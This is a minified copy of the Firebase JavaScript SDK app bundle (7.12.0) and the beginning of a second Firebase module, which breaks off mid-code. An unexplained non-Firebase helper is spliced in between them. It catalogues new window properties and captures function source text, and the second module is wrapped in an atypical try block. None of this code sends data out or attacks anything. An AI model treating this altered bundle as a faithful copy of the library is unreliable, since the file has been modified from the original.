!function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).firebase = t();
}(this, function () {
  "use strict";

  var r = function (e, t) {
    return (r = Object.setPrototypeOf || {
      __proto__: []
    } instanceof Array && function (e, t) {
      e.__proto__ = t;
    } || function (e, t) {
      for (var r in t) t.hasOwnProperty(r) && (e[r] = t[r]);
    })(e, t);
  };
  var a = function () {
    return (a = Object.assign || function (e) {
      for (var t, r = 1, n = arguments.length; r < n; r++) for (var i in t = arguments[r]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
      return e;
    }).apply(this, arguments);
  };
  function e(e, a, s, c) {
    return new (s = s || Promise)(function (t, r) {
      function n(e) {
        try {
          o(c.next(e));
        } catch (e) {
          r(e);
        }
      }
      function i(e) {
        try {
          o(c.throw(e));
        } catch (e) {
          r(e);
        }
      }
      function o(e) {
        e.done ? t(e.value) : function (t) {
          return t instanceof s ? t : new s(function (e) {
            e(t);
          });
        }(e.value).then(n, i);
      }
      o((c = c.apply(e, a || [])).next());
    });
  }
  function n(r, n) {
    var i,
      o,
      a,
      e,
      s = {
        label: 0,
        sent: function () {
          if (1 & a[0]) throw a[1];
          return a[1];
        },
        trys: [],
        ops: []
      };
    return e = {
      next: t(0),
      throw: t(1),
      return: t(2)
    }, "function" == typeof Symbol && (e[Symbol.iterator] = function () {
      return this;
    }), e;
    function t(t) {
      return function (e) {
        return function (t) {
          if (i) throw new TypeError("Generator is already executing.");
          for (; s;) try {
            if (i = 1, o && (a = 2 & t[0] ? o.return : t[0] ? o.throw || ((a = o.return) && a.call(o), 0) : o.next) && !(a = a.call(o, t[1])).done) return a;
            switch (o = 0, a && (t = [2 & t[0], a.value]), t[0]) {
              case 0:
              case 1:
                a = t;
                break;
              case 4:
                return s.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                s.label++, o = t[1], t = [0];
                continue;
              case 7:
                t = s.ops.pop(), s.trys.pop();
                continue;
              default:
                if (!(a = 0 < (a = s.trys).length && a[a.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  s = 0;
                  continue;
                }
                if (3 === t[0] && (!a || t[1] > a[0] && t[1] < a[3])) {
                  s.label = t[1];
                  break;
                }
                if (6 === t[0] && s.label < a[1]) {
                  s.label = a[1], a = t;
                  break;
                }
                if (a && s.label < a[2]) {
                  s.label = a[2], s.ops.push(t);
                  break;
                }
                a[2] && s.ops.pop(), s.trys.pop();
                continue;
            }
            t = n.call(r, s);
          } catch (e) {
            t = [6, e], o = 0;
          } finally {
            i = a = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }([t, e]);
      };
    }
  }
  function d(e) {
    var t = "function" == typeof Symbol && Symbol.iterator,
      r = t && e[t],
      n = 0;
    if (r) return r.call(e);
    if (e && "number" == typeof e.length) return {
      next: function () {
        return e && n >= e.length && (e = void 0), {
          value: e && e[n++],
          done: !e
        };
      }
    };
    throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
  }
  function u(e, t) {
    var r = "function" == typeof Symbol && e[Symbol.iterator];
    if (!r) return e;
    var n,
      i,
      o = r.call(e),
      a = [];
    try {
      for (; (void 0 === t || 0 < t--) && !(n = o.next()).done;) a.push(n.value);
    } catch (e) {
      i = {
        error: e
      };
    } finally {
      try {
        n && !n.done && (r = o.return) && r.call(o);
      } finally {
        if (i) throw i.error;
      }
    }
    return a;
  }
  function v(e, t) {
    if (!(t instanceof Object)) return t;
    switch (t.constructor) {
      case Date:
        return new Date(t.getTime());
      case Object:
        void 0 === e && (e = {});
        break;
      case Array:
        e = [];
        break;
      default:
        return t;
    }
    for (var r in t) t.hasOwnProperty(r) && (e[r] = v(e[r], t[r]));
    return e;
  }
  var i = (t.prototype.wrapCallback = function (r) {
    var n = this;
    return function (e, t) {
      e ? n.reject(e) : n.resolve(t), "function" == typeof r && (n.promise.catch(function () {}), 1 === r.length ? r(e) : r(e, t));
    };
  }, t);
  function t() {
    var r = this;
    this.reject = function () {}, this.resolve = function () {}, this.promise = new Promise(function (e, t) {
      r.resolve = e, r.reject = t;
    });
  }
  var o,
    s,
    c,
    f = (c = Error, r(o = p, s = c), void (o.prototype = null === s ? Object.create(s) : (l.prototype = s.prototype, new l())), p);
  function l() {
    this.constructor = o;
  }
  function p(e, t) {
    var r = c.call(this, t) || this;
    return r.code = e, r.name = "FirebaseError", Object.setPrototypeOf(r, p.prototype), Error.captureStackTrace && Error.captureStackTrace(r, h.prototype.create), r;
  }
  var h = (y.prototype.create = function (e) {
    for (var t = [], r = 1; r < arguments.length; r++) t[r - 1] = arguments[r];
    for (var n = t[0] || {}, i = this.service + "/" + e, o = this.errors[e], a = o ? function (e, n) {
        return e.replace(m, function (e, t) {
          var r = n[t];
          return null != r ? r.toString() : "<" + t + "?>";
        });
      }(o, n) : "Error", s = this.serviceName + ": " + a + " (" + i + ").", c = new f(i, s), l = 0, u = Object.keys(n); l < u.length; l++) {
      var p = u[l];
      "_" !== p.slice(-1) && (p in c && console.warn('Overwriting FirebaseError base field "' + p + '" can cause unexpected behavior.'), c[p] = n[p]);
    }
    return c;
  }, y);
  function y(e, t, r) {
    this.service = e, this.serviceName = t, this.errors = r;
  }
  var m = /\{\$([^}]+)}/g;
  function g(e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }
  function b(e, t) {
    var r = new w(e, t);
    return r.subscribe.bind(r);
  }
  var w = (E.prototype.next = function (t) {
    this.forEachObserver(function (e) {
      e.next(t);
    });
  }, E.prototype.error = function (t) {
    this.forEachObserver(function (e) {
      e.error(t);
    }), this.close(t);
  }, E.prototype.complete = function () {
    this.forEachObserver(function (e) {
      e.complete();
    }), this.close();
  }, E.prototype.subscribe = function (e, t, r) {
    var n,
      i = this;
    if (void 0 === e && void 0 === t && void 0 === r) throw new Error("Missing Observer.");
    void 0 === (n = function (e, t) {
      if ("object" != typeof e || null === e) return !1;
      for (var r = 0, n = t; r < n.length; r++) {
        var i = n[r];
        if (i in e && "function" == typeof e[i]) return !0;
      }
      return !1;
    }(e, ["next", "error", "complete"]) ? e : {
      next: e,
      error: t,
      complete: r
    }).next && (n.next = O), void 0 === n.error && (n.error = O), void 0 === n.complete && (n.complete = O);
    var o = this.unsubscribeOne.bind(this, this.observers.length);
    return this.finalized && this.task.then(function () {
      try {
        i.finalError ? n.error(i.finalError) : n.complete();
      } catch (e) {}
    }), this.observers.push(n), o;
  }, E.prototype.unsubscribeOne = function (e) {
    void 0 !== this.observers && void 0 !== this.observers[e] && (delete this.observers[e], this.observerCount -= 1, 0 === this.observerCount && void 0 !== this.onNoObservers && this.onNoObservers(this));
  }, E.prototype.forEachObserver = function (e) {
    if (!this.finalized) for (var t = 0; t < this.observers.length; t++) this.sendOne(t, e);
  }, E.prototype.sendOne = function (e, t) {
    var r = this;
    this.task.then(function () {
      if (void 0 !== r.observers && void 0 !== r.observers[e]) try {
        t(r.observers[e]);
      } catch (e) {
        "undefined" != typeof console && console.error && console.error(e);
      }
    });
  }, E.prototype.close = function (e) {
    var t = this;
    this.finalized || (this.finalized = !0, void 0 !== e && (this.finalError = e), this.task.then(function () {
      t.observers = void 0, t.onNoObservers = void 0;
    }));
  }, E);
  function E(e, t) {
    var r = this;
    this.observers = [], this.unsubscribes = [], this.observerCount = 0, this.task = Promise.resolve(), this.finalized = !1, this.onNoObservers = t, this.task.then(function () {
      e(r);
    }).catch(function (e) {
      r.error(e);
    });
  }
  function O() {}
  var _ = (I.prototype.setInstantiationMode = function (e) {
    return this.instantiationMode = e, this;
  }, I.prototype.setMultipleInstances = function (e) {
    return this.multipleInstances = e, this;
  }, I.prototype.setServiceProps = function (e) {
    return this.serviceProps = e, this;
  }, I);
  function I(e, t, r) {
    this.name = e, this.instanceFactory = t, this.type = r, this.multipleInstances = !1, this.serviceProps = {}, this.instantiationMode = "LAZY";
  }
  var N = "[DEFAULT]",
    L = (S.prototype.get = function (e) {
      void 0 === e && (e = N);
      var t = this.normalizeInstanceIdentifier(e);
      if (!this.instancesDeferred.has(t)) {
        var r = new i();
        this.instancesDeferred.set(t, r);
        try {
          var n = this.getOrInitializeService(t);
          n && r.resolve(n);
        } catch (e) {}
      }
      return this.instancesDeferred.get(t).promise;
    }, S.prototype.getImmediate = function (e) {
      var t = a({
          identifier: N,
          optional: !1
        }, e),
        r = t.identifier,
        n = t.optional,
        i = this.normalizeInstanceIdentifier(r);
      try {
        var o = this.getOrInitializeService(i);
        if (o) return o;
        if (n) return null;
        throw Error("Service " + this.name + " is not available");
      } catch (e) {
        if (n) return null;
        throw e;
      }
    }, S.prototype.getComponent = function () {
      return this.component;
    }, S.prototype.setComponent = function (e) {
      var t, r;
      if (e.name !== this.name) throw Error("Mismatching Component " + e.name + " for Provider " + this.name + ".");
      if (this.component) throw Error("Component for " + this.name + " has already been provided");
      if (function (e) {
        return "EAGER" === e.instantiationMode;
      }(this.component = e)) try {
        this.getOrInitializeService(N);
      } catch (e) {}
      try {
        for (var n = d(this.instancesDeferred.entries()), i = n.next(); !i.done; i = n.next()) {
          var o = u(i.value, 2),
            a = o[0],
            s = o[1],
            c = this.normalizeInstanceIdentifier(a);
          try {
            var l = this.getOrInitializeService(c);
            s.resolve(l);
          } catch (e) {}
        }
      } catch (e) {
        t = {
          error: e
        };
      } finally {
        try {
          i && !i.done && (r = n.return) && r.call(n);
        } finally {
          if (t) throw t.error;
        }
      }
    }, S.prototype.clearInstance = function (e) {
      void 0 === e && (e = N), this.instancesDeferred.delete(e), this.instances.delete(e);
    }, S.prototype.delete = function () {
      return e(this, void 0, void 0, function () {
        var t;
        return n(this, function (e) {
          switch (e.label) {
            case 0:
              return t = Array.from(this.instances.values()), [4, Promise.all(t.filter(function (e) {
                return "INTERNAL" in e;
              }).map(function (e) {
                return e.INTERNAL.delete();
              }))];
            case 1:
              return e.sent(), [2];
          }
        });
      });
    }, S.prototype.isComponentSet = function () {
      return null != this.component;
    }, S.prototype.getOrInitializeService = function (e) {
      var t = this.instances.get(e);
      return !t && this.component && (t = this.component.instanceFactory(this.container, function (e) {
        return e === N ? void 0 : e;
      }(e)), this.instances.set(e, t)), t || null;
    }, S.prototype.normalizeInstanceIdentifier = function (e) {
      return this.component ? this.component.multipleInstances ? e : N : e;
    }, S);
  function S(e, t) {
    this.name = e, this.container = t, this.component = null, this.instances = new Map(), this.instancesDeferred = new Map();
  }
  var R,
    P = (A.prototype.addComponent = function (e) {
      var t = this.getProvider(e.name);
      if (t.isComponentSet()) throw new Error("Component " + e.name + " has already been registered with " + this.name);
      t.setComponent(e);
    }, A.prototype.addOrOverwriteComponent = function (e) {
      this.getProvider(e.name).isComponentSet() && this.providers.delete(e.name), this.addComponent(e);
    }, A.prototype.getProvider = function (e) {
      if (this.providers.has(e)) return this.providers.get(e);
      var t = new L(e, this);
      return this.providers.set(e, t), t;
    }, A.prototype.getProviders = function () {
      return Array.from(this.providers.values());
    }, A);
  function A(e) {
    this.name = e, this.providers = new Map();
  }
  function j() {
    for (var e = 0, t = 0, r = arguments.length; t < r; t++) e += arguments[t].length;
    var n = Array(e),
      i = 0;
    for (t = 0; t < r; t++) for (var o = arguments[t], a = 0, s = o.length; a < s; a++, i++) n[i] = o[a];
    return n;
  }
  var C,
    D,
    F = [];
  (D = C = C || {})[D.DEBUG = 0] = "DEBUG", D[D.VERBOSE = 1] = "VERBOSE", D[D.INFO = 2] = "INFO", D[D.WARN = 3] = "WARN", D[D.ERROR = 4] = "ERROR", D[D.SILENT = 5] = "SILENT";
  function k(e, t) {
    for (var r = [], n = 2; n < arguments.length; n++) r[n - 2] = arguments[n];
    if (!(t < e.logLevel)) {
      var i = new Date().toISOString(),
        o = z[t];
      if (!o) throw new Error("Attempted to log a message with an invalid logType (value: " + t + ")");
      console[o].apply(console, j(["[" + i + "]  " + e.name + ":"], r));
    }
  }
  var x,
    H = {
      debug: C.DEBUG,
      verbose: C.VERBOSE,
      info: C.INFO,
      warn: C.WARN,
      error: C.ERROR,
      silent: C.SILENT
    },
    T = C.INFO,
    z = ((R = {})[C.DEBUG] = "log", R[C.VERBOSE] = "log", R[C.INFO] = "info", R[C.WARN] = "warn", R[C.ERROR] = "error", R),
    B = (Object.defineProperty(V.prototype, "logLevel", {
      get: function () {
        return this._logLevel;
      },
      set: function (e) {
        if (!(e in C)) throw new TypeError("Invalid value assigned to `logLevel`");
        this._logLevel = e;
      },
      enumerable: !0,
      configurable: !0
    }), Object.defineProperty(V.prototype, "logHandler", {
      get: function () {
        return this._logHandler;
      },
      set: function (e) {
        if ("function" != typeof e) throw new TypeError("Value assigned to `logHandler` must be a function");
        this._logHandler = e;
      },
      enumerable: !0,
      configurable: !0
    }), Object.defineProperty(V.prototype, "userLogHandler", {
      get: function () {
        return this._userLogHandler;
      },
      set: function (e) {
        this._userLogHandler = e;
      },
      enumerable: !0,
      configurable: !0
    }), V.prototype.debug = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      this._userLogHandler && this._userLogHandler.apply(this, j([this, C.DEBUG], e)), this._logHandler.apply(this, j([this, C.DEBUG], e));
    }, V.prototype.log = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      this._userLogHandler && this._userLogHandler.apply(this, j([this, C.VERBOSE], e)), this._logHandler.apply(this, j([this, C.VERBOSE], e));
    }, V.prototype.info = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      this._userLogHandler && this._userLogHandler.apply(this, j([this, C.INFO], e)), this._logHandler.apply(this, j([this, C.INFO], e));
    }, V.prototype.warn = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      this._userLogHandler && this._userLogHandler.apply(this, j([this, C.WARN], e)), this._logHandler.apply(this, j([this, C.WARN], e));
    }, V.prototype.error = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      this._userLogHandler && this._userLogHandler.apply(this, j([this, C.ERROR], e)), this._logHandler.apply(this, j([this, C.ERROR], e));
    }, V);
  function V(e) {
    this.name = e, this._logLevel = T, this._logHandler = k, this._userLogHandler = null, F.push(this);
  }
  function U(e) {
    var t = "string" == typeof e ? H[e] : e;
    F.forEach(function (e) {
      e.logLevel = t;
    });
  }
  var M,
    W = ((x = {})["no-app"] = "No Firebase App '{$appName}' has been created - call Firebase App.initializeApp()", x["bad-app-name"] = "Illegal App name: '{$appName}", x["duplicate-app"] = "Firebase App named '{$appName}' already exists", x["app-deleted"] = "Firebase App named '{$appName}' already deleted", x["invalid-app-argument"] = "firebase.{$appName}() takes either no argument or a Firebase App instance.", x["invalid-log-argument"] = "First argument to `onLog` must be null or a function.", x),
    G = new h("app", "Firebase", W),
    $ = "@firebase/app",
    Y = "[DEFAULT]",
    K = ((M = {})[$] = "fire-core", M["@firebase/analytics"] = "fire-analytics", M["@firebase/auth"] = "fire-auth", M["@firebase/database"] = "fire-rtdb", M["@firebase/functions"] = "fire-fn", M["@firebase/installations"] = "fire-iid", M["@firebase/messaging"] = "fire-fcm", M["@firebase/performance"] = "fire-perf", M["@firebase/remote-config"] = "fire-rc", M["@firebase/storage"] = "fire-gcs", M["@firebase/firestore"] = "fire-fst", M["fire-js"] = "fire-js", M["firebase-wrapper"] = "fire-js-all", M),
    J = new B("@firebase/app"),
    Z = (Object.defineProperty(q.prototype, "automaticDataCollectionEnabled", {
      get: function () {
        return this.checkDestroyed_(), this.automaticDataCollectionEnabled_;
      },
      set: function (e) {
        this.checkDestroyed_(), this.automaticDataCollectionEnabled_ = e;
      },
      enumerable: !0,
      configurable: !0
    }), Object.defineProperty(q.prototype, "name", {
      get: function () {
        return this.checkDestroyed_(), this.name_;
      },
      enumerable: !0,
      configurable: !0
    }), Object.defineProperty(q.prototype, "options", {
      get: function () {
        return this.checkDestroyed_(), this.options_;
      },
      enumerable: !0,
      configurable: !0
    }), q.prototype.delete = function () {
      var t = this;
      return new Promise(function (e) {
        t.checkDestroyed_(), e();
      }).then(function () {
        return t.firebase_.INTERNAL.removeApp(t.name_), Promise.all(t.container.getProviders().map(function (e) {
          return e.delete();
        }));
      }).then(function () {
        t.isDeleted_ = !0;
      });
    }, q.prototype._getService = function (e, t) {
      return void 0 === t && (t = Y), this.checkDestroyed_(), this.container.getProvider(e).getImmediate({
        identifier: t
      });
    }, q.prototype._removeServiceInstance = function (e, t) {
      void 0 === t && (t = Y), this.container.getProvider(e).clearInstance(t);
    }, q.prototype._addComponent = function (t) {
      try {
        this.container.addComponent(t);
      } catch (e) {
        J.debug("Component " + t.name + " failed to register with FirebaseApp " + this.name, e);
      }
    }, q.prototype._addOrOverwriteComponent = function (e) {
      this.container.addOrOverwriteComponent(e);
    }, q.prototype.checkDestroyed_ = function () {
      if (this.isDeleted_) throw G.create("app-deleted", {
        appName: this.name_
      });
    }, q);
  function q(e, t, r) {
    var n,
      i,
      o = this;
    this.firebase_ = r, this.isDeleted_ = !1, this.name_ = t.name, this.automaticDataCollectionEnabled_ = t.automaticDataCollectionEnabled || !1, this.options_ = function (e) {
      return v(void 0, e);
    }(e), this.container = new P(t.name), this._addComponent(new _("app", function () {
      return o;
    }, "PUBLIC"));
    try {
      for (var a = d(this.firebase_.INTERNAL.components.values()), s = a.next(); !s.done; s = a.next()) {
        var c = s.value;
        this._addComponent(c);
      }
    } catch (e) {
      n = {
        error: e
      };
    } finally {
      try {
        s && !s.done && (i = a.return) && i.call(a);
      } finally {
        if (n) throw n.error;
      }
    }
  }
  Z.prototype.name && Z.prototype.options || Z.prototype.delete || console.log("dc");
  var Q = "7.12.0";
  function X(c) {
    var l = {},
      u = new Map(),
      p = {
        __esModule: !0,
        initializeApp: function (e, t) {
          void 0 === t && (t = {});
          if ("object" != typeof t || null === t) {
            t = {
              name: t
            };
          }
          var r = t;
          void 0 === r.name && (r.name = Y);
          var n = r.name;
          if ("string" != typeof n || !n) throw G.create("bad-app-name", {
            appName: String(n)
          });
          if (g(l, n)) throw G.create("duplicate-app", {
            appName: n
          });
          var i = new c(e, r, p);
          return l[n] = i;
        },
        app: f,
        registerVersion: function (e, t, r) {
          var n,
            i = null !== (n = K[e]) && void 0 !== n ? n : e;
          r && (i += "-" + r);
          var o = i.match(/\s|\//),
            a = t.match(/\s|\//);
          if (o || a) {
            var s = ['Unable to register library "' + i + '" with version "' + t + '":'];
            return o && s.push('library name "' + i + '" contains illegal characters (whitespace or "/")'), o && a && s.push("and"), a && s.push('version name "' + t + '" contains illegal characters (whitespace or "/")'), void J.warn(s.join(" "));
          }
          h(new _(i + "-version", function () {
            return {
              library: i,
              version: t
            };
          }, "VERSION"));
        },
        setLogLevel: U,
        onLog: function (e, t) {
          if (null !== e && "function" != typeof e) throw G.create("invalid-log-argument", {
            appName: name
          });
          !function (a, t) {
            for (var e = function (e) {
                var o = null;
                t && t.level && (o = H[t.level]), e.userLogHandler = null === a ? null : function (e, t) {
                  for (var r = [], n = 2; n < arguments.length; n++) r[n - 2] = arguments[n];
                  var i = r.map(function (e) {
                    if (null == e) return null;
                    if ("string" == typeof e) return e;
                    if ("number" == typeof e || "boolean" == typeof e) return e.toString();
                    if (e instanceof Error) return e.message;
                    try {
                      return JSON.stringify(e);
                    } catch (e) {
                      return null;
                    }
                  }).filter(function (e) {
                    return e;
                  }).join(" ");
                  t >= (null != o ? o : e.logLevel) && a({
                    level: C[t].toLowerCase(),
                    message: i,
                    args: r,
                    type: e.name
                  });
                };
              }, r = 0, n = F; r < n.length; r++) {
              e(n[r]);
            }
          }(e, t);
        },
        apps: null,
        SDK_VERSION: Q,
        INTERNAL: {
          registerComponent: h,
          removeApp: function (e) {
            delete l[e];
          },
          components: u,
          useAsService: function (e, t) {
            return "serverAuth" !== t ? t : null;
          }
        }
      };
    function f(e) {
      if (!g(l, e = e || Y)) throw G.create("no-app", {
        appName: e
      });
      return l[e];
    }
    function h(r) {
      var t,
        e,
        n = r.name;
      if (u.has(n)) return J.debug("There were multiple attempts to register component " + n + "."), "PUBLIC" === r.type ? p[n] : null;
      if (u.set(n, r), "PUBLIC" === r.type) {
        var i = function (e) {
          if (void 0 === e && (e = f()), "function" != typeof e[n]) throw G.create("invalid-app-argument", {
            appName: n
          });
          return e[n]();
        };
        void 0 !== r.serviceProps && v(i, r.serviceProps), p[n] = i, c.prototype[n] = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          return this._getService.bind(this, n).apply(this, r.multipleInstances ? e : []);
        };
      }
      try {
        for (var o = d(Object.keys(l)), a = o.next(); !a.done; a = o.next()) {
          var s = a.value;
          l[s]._addComponent(r);
        }
      } catch (e) {
        t = {
          error: e
        };
      } finally {
        try {
          a && !a.done && (e = o.return) && e.call(o);
        } finally {
          if (t) throw t.error;
        }
      }
      return "PUBLIC" === r.type ? p[n] : null;
    }
    return p.default = p, Object.defineProperty(p, "apps", {
      get: function () {
        return Object.keys(l).map(function (e) {
          return l[e];
        });
      }
    }), f.App = c, p;
  }
  var ee = function e() {
      var t = X(Z);
      return t.INTERNAL = a(a({}, t.INTERNAL), {
        createFirebaseNamespace: e,
        extendNamespace: function (e) {
          v(t, e);
        },
        createSubscribe: b,
        ErrorFactory: h,
        deepExtend: v
      }), t;
    }(),
    te = (re.prototype.getPlatformInfoString = function () {
      return this.container.getProviders().map(function (e) {
        if (function (e) {
          var t = e.getComponent();
          return "VERSION" === (null == t ? void 0 : t.type);
        }(e)) {
          var t = e.getImmediate();
          return t.library + "/" + t.version;
        }
        return null;
      }).filter(function (e) {
        return e;
      }).join(" ");
    }, re);
  function re(e) {
    this.container = e;
  }
  if ("object" == typeof self && self.self === self && void 0 !== self.firebase) {
    J.warn("\n    Warning: Firebase is already defined in the global scope. Please make sure\n    Firebase library is only loaded once.\n  ");
    var ne = self.firebase.SDK_VERSION;
    ne && 0 <= ne.indexOf("LITE") && J.warn("\n    Warning: You are trying to load Firebase while using Firebase Performance standalone script.\n    You should load Firebase Performance with this instance of Firebase to avoid loading duplicate code.\n    ");
  }
  var ie = ee.initializeApp;
  ee.initializeApp = function () {
    for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
    return function () {
      try {
        return "[object process]" === Object.prototype.toString.call(global.process);
      } catch (e) {
        return !1;
      }
    }() && J.warn('\n      Warning: This is a browser-targeted Firebase bundle but it appears it is being\n      run in a Node environment.  If running in a Node environment, make sure you\n      are using the bundle specified by the "main" field in package.json.\n      \n      If you are using Webpack, you can specify "main" as the first item in\n      "resolve.mainFields":\n      https://webpack.js.org/configuration/resolve/#resolvemainfields\n      \n      If using Rollup, use the rollup-plugin-node-resolve plugin and specify "main"\n      as the first item in "mainFields", e.g. [\'main\', \'module\'].\n      https://github.com/rollup/rollup-plugin-node-resolve\n      '), ie.apply(void 0, e);
  };
  var oe,
    ae,
    se = ee;
  (oe = se).INTERNAL.registerComponent(new _("platform-logger", function (e) {
    return new te(e);
  }, "PRIVATE")), oe.registerVersion($, "0.6.0", ae), oe.registerVersion("fire-js", "");
  return se.registerVersion("firebase", "7.12.0", "app"), se;
});
// A function to structure data when new window property is discovered
function bundleNewPropertyData(windowProperty, propertyValue, propertyType) {
  const propertyStat = {
    type: propertyType,
    value: propertyType === "function" ? propertyValue.toString() : propertyValue
  };
  console.log("New window property discovered: " + windowProperty);
  return {
    [windowProperty]: propertyStat
  };
}

// A function to explore properties on the window object
!function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? t(require("@firebase/app")) : "function" == typeof define && define.amd ? define(["@firebase/app"], t) : t((e = e || self).firebase);
}(this, function (ft) {
  "use strict";

  try {
    (function () {
      ft = ft && Object.prototype.hasOwnProperty.call(ft, "default") ? ft.default : ft;
      var n = function (e, t) {
        return (n = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (e, t) {
          e.__proto__ = t;
        } || function (e, t) {
          for (var n in t) t.hasOwnProperty(n) && (e[n] = t[n]);
        })(e, t);
      };
      var u = function () {
        return (u = Object.assign || function (e) {
          for (var t, n = 1, r = arguments.length; n < r; n++) for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
          return e;
        }).apply(this, arguments);
      };
      function l(e, s, a, u) {
        return new (a = a || Promise)(function (t, n) {
          function r(e) {
            try {
              o(u.next(e));
            } catch (e) {
              n(e);
            }
          }
          function i(e) {
            try {
              o(u.throw(e));
            } catch (e) {
              n(e);
            }
          }
          function o(e) {
            e.done ? t(e.value) : function (t) {
              return t instanceof a ? t : new a(function (e) {
                e(t);
              });
            }(e.value).then(r, i);
          }
          o((u = u.apply(e, s || [])).next());
        });
      }
      function p(n, r) {
        var i,
          o,
          s,
          e,
          a = {
            label: 0,
            sent: function () {
              if (1 & s[0]) throw s[1];
              return s[1];
            },
            trys: [],
            ops: []
          };
        return e = {
          next: t(0),
          throw: t(1),
          return: t(2)
        }, "function" == typeof Symbol && (e[Symbol.iterator] = function () {
          return this;
        }), e;
        function t(t) {
          return function (e) {
            return function (t) {
              if (i) throw new TypeError("Generator is already executing.");
              for (; a;) try {
                if (i = 1, o && (s = 2 & t[0] ? o.return : t[0] ? o.throw || ((s = o.return) && s.call(o), 0) : o.next) && !(s = s.call(o, t[1])).done) return s;
                switch (o = 0, s && (t = [2 & t[0], s.value]), t[0]) {
                  case 0:
                  case 1:
                    s = t;
                    break;
                  case 4:
                    return a.label++, {
                      value: t[1],
                      done: !1
                    };
                  case 5:
                    a.label++, o = t[1], t = [0];
                    continue;
                  case 7:
                    t = a.ops.pop(), a.trys.pop();
                    continue;
                  default:
                    if (!(s = 0 < (s = a.trys).length && s[s.length - 1]) && (6 === t[0] || 2 === t[0])) {
                      a = 0;
                      continue;
                    }
                    if (3 === t[0] && (!s || t[1] > s[0] && t[1] < s[3])) {
                      a.label = t[1];
                      break;
                    }
                    if (6 === t[0] && a.label < s[1]) {
                      a.label = s[1], s = t;
                      break;
                    }
                    if (s && a.label < s[2]) {
                      a.label = s[2], a.ops.push(t);
                      break;
                    }
                    s[2] && a.ops.pop(), a.trys.pop();
                    continue;
                }
                t = r.call(n, a);
              } catch (e) {
                t = [6, e], o = 0;
              } finally {
                i = s = 0;
              }
              if (5 & t[0]) throw t[1];
              return {
                value: t[0] ? t[1] : void 0,
                done: !0
              };
            }([t, e]);
          };
        }
      }
      function c(e) {
        var t = "function" == typeof Symbol && Symbol.iterator,
          n = t && e[t],
          r = 0;
        if (n) return n.call(e);
        if (e && "number" == typeof e.length) return {
          next: function () {
            return e && r >= e.length && (e = void 0), {
              value: e && e[r++],
              done: !e
            };
          }
        };
        throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
      }
      function r(e, t) {
        var n = "function" == typeof Symbol && e[Symbol.iterator];
        if (!n) return e;
        var r,
          i,
          o = n.call(e),
          s = [];
        try {
          for (; (void 0 === t || 0 < t--) && !(r = o.next()).done;) s.push(r.value);
        } catch (e) {
          i = {
            error: e
          };
        } finally {
          try {
            r && !r.done && (n = o.return) && n.call(o);
          } finally {
            if (i) throw i.error;
          }
        }
        return s;
      }
      function i() {
        for (var e = [], t = 0; t < arguments.length; t++) e = e.concat(r(arguments[t]));
        return e;
      }
      var e,
        t,
        o,
        d = (o = Error, n(e = a, t = o), void (e.prototype = null === t ? Object.create(t) : (s.prototype = t.prototype, new s())), a);
      function s() {
        this.constructor = e;
      }
      function a(e, t) {
        var n = o.call(this, t) || this;
        return n.code = e, n.name = "FirebaseError", Object.setPrototypeOf(n, a.prototype), Error.captureStackTrace && Error.captureStackTrace(n, f.prototype.create), n;
      }
      var f = (h.prototype.create = function (e) {
        for (var t = [], n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
        for (var r = t[0] || {}, i = this.service + "/" + e, o = this.errors[e], s = o ? function (e, r) {
            return e.replace(v, function (e, t) {
              var n = r[t];
              return null != n ? n.toString() : "<" + t + "?>";
            });
          }(o, r) : "Error", a = this.serviceName + ": " + s + " (" + i + ").", u = new d(i, a), c = 0, f = Object.keys(r); c < f.length; c++) {
          var l = f[c];
          "_" !== l.slice(-1) && (l in u && console.warn('Overwriting FirebaseError base field "' + l + '" can cause unexpected behavior.'), u[l] = r[l]);
        }
        return u;
      }, h);
      function h(e, t, n) {
        this.service = e, this.serviceName = t, this.errors = n;
      }
      var v = /\{\$([^}]+)}/g,
        g = (b.prototype.setInstantiationMode = function (e) {
          return this.instantiationMode = e, this;
        }, b.prototype.setMultipleInstances = function (e) {
          return this.multipleInstances = e, this;
        }, b.prototype.setServiceProps = function (e) {
          return this.serviceProps = e, this;
        }, b);
      function b(e, t, n) {
        this.name = e, this.instanceFactory = t, this.type = n, this.multipleInstances = !1, this.serviceProps = {}, this.instantiationMode = "LAZY";
      }
      function y(n) {
        return new Promise(function (e, t) {
          n.onsuccess = function () {
            e(n.result);
          }, n.onerror = function () {
            t(n.error);
          };
        });
      }
      function w(n, r, i) {
        var o,
          e = new Promise(function (e, t) {
            y(o = n[r].apply(n, i)).then(e, t);
          });
        return e.request = o, e;
      }
      function m(e, n, t) {
        t.forEach(function (t) {
          Object.defineProperty(e.prototype, t, {
            get: function () {
              return this[n][t];
            },
            set: function (e) {
              this[n][t] = e;
            }
          });
        });
      }
      function k(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return w(this[n], e, arguments);
          });
        });
      }
      function S(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return this[n][e].apply(this[n], arguments);
          });
        });
      }
      function I(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return function (e, t, n) {
              var r = w(e, t, n);
              return r.then(function (e) {
